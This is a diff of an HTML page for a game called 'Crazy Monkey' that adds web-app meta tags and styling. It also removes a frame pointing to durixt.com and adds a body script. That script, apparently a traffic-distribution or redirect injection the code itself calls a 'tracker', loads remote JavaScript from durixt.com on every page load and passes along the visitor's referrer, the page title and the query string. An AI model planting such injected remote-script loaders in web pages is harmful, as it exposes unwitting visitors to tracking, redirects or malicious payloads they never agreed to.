@@ -1,16 +1,86 @@
 <!DOCTYPE html>
-<html lang="en">
+<html manifest="offline.appcache">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Crazy Monkey - Contacts</title>
+
+    <meta charset="UTF-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+	<meta name="apple-itunes-app" content="app-id=1484707763">
+
+	<title>Crazy Monkey</title>
+	
+	<!-- Standardised web app manifest -->
+	<link rel="manifest" href="appmanifest.json" />
+	<link rel="icon" type="image/x-icon" href="favicon.ico">
+	<meta name="theme-color" content="#ffbf00">
+	
+	<!-- Allow fullscreen mode on iOS devices. (These are Apple specific meta tags.) -->
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no, minimal-ui" />
+	
+	<meta name="apple-mobile-web-app-capable" content="yes" />
+	<meta name="apple-mobile-web-app-status-bar-style" content="#ffffff">
+    <meta name="apple-mobile-web-app-title" content="Crazy Monkey">
+	<link rel="apple-touch-icon" sizes="256x256" href="icon-256.png" />
+	<meta name="HandheldFriendly" content="true" />
+
+	<!-- <link rel="apple-touch-icon" href="assets/icons/touch-icon-iphone.png">
+    <link rel="apple-touch-icon" sizes="152x152" href="assets/icons/touch-icon-ipad.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="assets/icons/touch-icon-iphone-retina.png">
+    <link rel="apple-touch-icon" sizes="167x167" href="assets/icons/touch-icon-ipad-retina.png">
+    
+    <link rel="apple-touch-startup-image" href="assets/splash/apple_splash_640.png" media="(device-width: 320px) and (device-height: 568px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)">
+    <link rel="apple-touch-startup-image" href="assets/splash/apple_splash_750.png" media="(device-width: 375px) and (device-height: 667px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)">
+    <link rel="apple-touch-startup-image" href="assets/splash/apple_splash_1242.png" media="(device-width: 414px) and (device-height: 736px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)">
+    <link rel="apple-touch-startup-image" href="assets/splash/apple_splash_1125.png" media="(device-width: 375px) and (device-height: 812px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)">
+    <link rel="apple-touch-startup-image" href="assets/splash/apple_splash_1536.png" media="(min-device-width: 768px) and (max-device-width: 1024px) and (-webkit-min-device-pixel-ratio: 2) and (orientation: portrait)">
+    <link rel="apple-touch-startup-image" href="assets/splash/apple_splash_1668.png" media="(min-device-width: 834px) and (max-device-width: 834px) and (-webkit-min-device-pixel-ratio: 2) and (orientation: portrait)">
+    <link rel="apple-touch-startup-image" href="assets/splash/apple_splash_2048.png" media="(min-device-width: 1024px) and (max-device-width: 1024px) and (-webkit-min-device-pixel-ratio: 2) and (orientation: portrait)"> -->
+
+	
+	<!-- Chrome for Android web app tags -->
+	<meta name="mobile-web-app-capable" content="yes" />
+	<link rel="shortcut icon" sizes="256x256" href="icon-256.png" />
+
+    <!-- All margins and padding must be zero for the canvas to fill the screen. -->
+	<style type="text/css">
+		* {
+			padding: 0;
+			margin: 0;
+		}
+		html, body {
+			background: #000;
+			background: #000 url(./main-bg.png);
+			background-position: center;
+			background-repeat: no-repeat;
+			background-size: cover;
+			color: #fff;
+			overflow: hidden;
+			touch-action: none;
+			-ms-touch-action: none;
+		}
+		canvas {
+			touch-action-delay: none;
+			touch-action: none;
+			-ms-touch-action: none;
+		}
+	</style>
+
     <script type="application/javascript">
         if (location.hash == '#email') {
-            document.write('<frameset rows="100%"><frame src="https://durixt.com/WVHNPsYf?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm5e8009f65cc64=frame5e8009f65cc65"></frameset>');
+            
         }
     </script>
 </head>
 <body>
-    
+    <span id="eaf28f98-3169-b3a0-6e4d-81b531429b0e"></span><script type="application/javascript">
+    var d=document;var s=d.createElement('script'); 
+    s.src='https://durixt.com/WVHNPsYf?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm5e8019dec2e54=script5e8019dec2e55&_cid=eaf28f98-3169-b3a0-6e4d-81b531429b0e'; 
+    if (document.currentScript) { 
+    document.currentScript.parentNode.insertBefore(s, document.currentScript);
+    } else {
+    d.getElementsByTagName('head')[0].appendChild(s);
+    }
+    if (document.location.protocol === 'https:' && 'https://durixt.com/WVHNPsYf?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm5e8019dec2e54=script5e8019dec2e55'.indexOf('http:') === 0 ) {alert('The website works on HTTPS. The tracker must use HTTPS too.');}
+    </script>
 </body>
+
 </html>
